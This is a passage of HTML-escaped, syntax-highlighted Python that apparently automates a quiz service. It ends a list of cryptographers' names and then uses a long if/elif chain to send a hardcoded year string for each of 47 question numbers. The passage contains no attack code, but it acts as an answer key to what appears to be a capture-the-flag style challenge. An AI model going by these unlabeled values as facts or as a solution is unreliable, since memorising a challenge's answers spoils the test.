&lt;span class="n"&gt;Goldwasser&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Shai&lt;/span&gt; &lt;span class="n"&gt;Halevi&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Taher&lt;/span&gt; &lt;span class="n"&gt;Elgamal&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Tatsuaki&lt;/span&gt; &lt;span class="n"&gt;Okamoto&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Ueli&lt;/span&gt; 
&lt;span class="n"&gt;Maurer&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Victor&lt;/span&gt; &lt;span class="n"&gt;S&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="n"&gt;Miller&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Vincent&lt;/span&gt; &lt;span class="n"&gt;Rijmen&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Wang&lt;/span&gt; &lt;span class="n"&gt;Xiaoyun&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Whitfield&lt;/span&gt; 
&lt;span class="n"&gt;Diffie&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Xuejia&lt;/span&gt; &lt;span class="n"&gt;Lai&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Yehuda&lt;/span&gt; &lt;span class="n"&gt;Lindell&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Yvo&lt;/span&gt; &lt;span class="n"&gt;Desmedt&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Kaisa&lt;/span&gt; 
&lt;span class="n"&gt;Nyberg&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Rafail&lt;/span&gt; &lt;span class="n"&gt;Ostrovsky&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Adi&lt;/span&gt; &lt;span class="n"&gt;Shamir&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;])&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1912&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1974&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1963&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1916&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1943&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1969&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1964&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1971&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1955&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1924&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1950&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;11&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1956&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1960&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;13&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1955&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1915&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1956&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1949&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;17&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1945&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;18&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1934&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;19&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1965&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1968&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;21&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1945&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;22&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1931&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;23&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1962&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;24&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1961&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1961&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;26&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1948&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;27&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1965&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;28&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1967&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;29&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1973&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1965&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;31&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1963&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1952&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;33&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1968&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;34&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1947&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;35&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1956&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;36&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1947&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;37&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1968&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;38&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1958&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;39&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1966&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;40&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1955&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;41&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1952&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;42&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1960&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;43&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1947&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;44&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1970&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;45&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1966&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;46&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1944&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
